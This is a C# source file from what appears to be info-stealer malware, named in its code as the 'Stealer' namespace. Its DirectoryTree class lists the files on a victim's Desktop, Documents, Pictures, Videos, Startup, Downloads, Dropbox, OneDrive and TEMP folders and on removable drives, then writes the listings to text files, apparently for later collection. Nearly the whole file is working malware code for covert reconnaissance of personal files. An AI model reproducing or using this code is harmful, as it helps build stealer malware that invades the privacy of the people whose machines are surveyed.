using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;

namespace Stealer;

internal sealed class DirectoryTree
{
	private static List<string> TargetDirs = new List<string>
	{
		Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
		Environment.GetFolderPath(Environment.SpecialFolder.Personal),
		Environment.GetFolderPath(Environment.SpecialFolder.MyPictures),
		Environment.GetFolderPath(Environment.SpecialFolder.MyVideos),
		Environment.GetFolderPath(Environment.SpecialFolder.Startup),
		Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Downloads"),
		Path.Combine(Environment.GetEnvironmentVariable("USERPROFILE"), "Dropbox"),
		Path.Combine(Environment.GetEnvironmentVariable("USERPROFILE"), "OneDrive"),
		Environment.GetEnvironmentVariable("TEMP")
	};

	private static string GetDirectoryTree(string path, string indentation = "\t", int maxLevel = -1, int deep = 0)
	{
		if (!Directory.Exists(path))
		{
			return "Directory not exists";
		}
		DirectoryInfo directoryInfo = new DirectoryInfo(path);
		StringBuilder stringBuilder = new StringBuilder();
		stringBuilder.AppendLine(string.Concat(string.Concat(Enumerable.Repeat(indentation, deep)), directoryInfo.Name, "\\"));
		if (maxLevel == -1 || maxLevel < deep)
		{
			try
			{
				DirectoryInfo[] directories = directoryInfo.GetDirectories();
				foreach (DirectoryInfo directoryInfo2 in directories)
				{
					try
					{
						stringBuilder.Append(GetDirectoryTree(directoryInfo2.FullName, indentation, maxLevel, deep + 1));
					}
					catch (UnauthorizedAccessException)
					{
					}
				}
			}
			catch (UnauthorizedAccessException)
			{
			}
		}
		try
		{
			FileInfo[] files = directoryInfo.GetFiles();
			foreach (FileInfo fileInfo in files)
			{
				stringBuilder.AppendLine(string.Concat(string.Concat(Enumerable.Repeat(indentation, deep + 1)), fileInfo.Name));
			}
		}
		catch (UnauthorizedAccessException)
		{
		}
		return stringBuilder.ToString();
	}

	private static string GetDirectoryName(string path)
	{
		string name = new DirectoryInfo(path).Name;
		if (name.Length == 3)
		{
			return "DRIVE-" + name.Replace(":\\", "");
		}
		return name;
	}

	public static void SaveDirectories(string sSavePath)
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.DriveType == DriveType.Removable && driveInfo.IsReady)
			{
				TargetDirs.Add(driveInfo.RootDirectory.FullName);
			}
		}
		foreach (string targetDir in TargetDirs)
		{
			try
			{
				string directoryTree = GetDirectoryTree(targetDir);
				string directoryName = GetDirectoryName(targetDir);
				if (!directoryTree.Contains("Directory not exists"))
				{
					File.WriteAllText(Path.Combine(sSavePath, directoryName + ".txt"), directoryTree);
				}
			}
			catch
			{
			}
		}
	}
}
